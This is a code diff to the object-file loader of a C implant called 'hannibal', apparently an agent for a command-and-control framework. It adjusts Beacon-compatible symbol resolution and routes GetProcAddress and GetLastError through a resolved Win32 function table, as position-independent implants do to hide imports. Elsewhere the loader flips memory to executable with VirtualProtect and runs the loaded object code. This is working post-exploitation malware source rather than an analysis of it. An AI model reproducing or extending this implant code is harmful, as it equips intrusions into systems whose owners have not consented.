@@ -111,10 +111,10 @@ PVOID ObjectResolveSymbol(PINSTANCE hannibal_instance_ptr, char *task_uuid, PSTR
 			Resolved = BeaconDataLength;
 		} else if (pic_strcmp("BeaconDataExtract", Symbol) == 0) {
 			Resolved = BeaconDataExtract;
-		} else if (pic_strcmp("BeaconOutputW", Symbol) == 0) {
-			Resolved = BeaconOutputW;
-		} else if (pic_strcmp("BeaconWPrintf", Symbol) == 0) {
-			Resolved = BeaconWPrintf;
+		} else if (pic_strcmp("BeaconOutput", Symbol) == 0) {
+			Resolved = BeaconOutput;
+		} else if (pic_strcmp("BeaconPrintf", Symbol) == 0) {
+			Resolved = BeaconPrintf;
 		}
 	} else {
 		//
@@ -153,7 +153,7 @@ PVOID ObjectResolveSymbol(PINSTANCE hannibal_instance_ptr, char *task_uuid, PSTR
 		//
 		// resolve function from the loaded library 
 		//
-		if (!(Resolved = GetProcAddress(Module, Function))) {
+		if (!(Resolved = hannibal_instance_ptr->Win32.GetProcAddress(Module, Function))) {
 			// printf("[!] Function not found inside of %s: %s\n", Library, Function);
                 pic_wsprintf(DbgString, L"[!] Function not found inside of %s: %s\n", Library, Function);
                 hannibal_response(DbgString, task_uuid);
@@ -417,7 +417,7 @@ BOOL ObjectExecute(PINSTANCE hannibal_instance_ptr, char *task_uuid, POBJECT_CTX
 			//
 			if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect)) {
 				// printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
-                    pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
+                    pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
                     hannibal_response(DbgString, task_uuid);
 				break;
 			}
@@ -433,7 +433,7 @@ BOOL ObjectExecute(PINSTANCE hannibal_instance_ptr, char *task_uuid, POBJECT_CTX
 			//
 			if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
 				// printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
-                    pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
+                    pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
                     hannibal_response(DbgString, task_uuid);
 				break;
 			}
